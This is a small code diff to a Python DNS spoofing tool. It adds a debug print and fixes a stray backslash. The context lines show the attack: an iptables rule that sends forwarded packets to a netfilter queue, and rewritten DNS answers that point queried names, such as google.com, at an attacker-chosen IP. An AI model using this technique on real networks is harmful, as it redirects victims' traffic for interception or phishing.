@@ -13,6 +13,7 @@ class DNS:
 
     def spoof(self):
         self.iPrint("Starting DNS spoof")
+        self.iPrint(self.map)
         # insert the iptables FORWARD rule
         os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(self.num))
         try:
@@ -68,7 +69,7 @@ class DNS:
         # craft new answer, overriding the original
         # setting the rdata for the IP we want to redirect (spoofed)
         # for instance, google.com will be mapped to "192.168.1.100"
-        packet[DNS].an = DNSRR(rrname=qname, rdata=self.map[qname])\
+        packet[DNS].an = DNSRR(rrname=qname, rdata=self.map[qname])
         # set the answer count to 1
         packet[DNS].ancount = 1
         # delete checksums and length of packet, because we have modified the packet
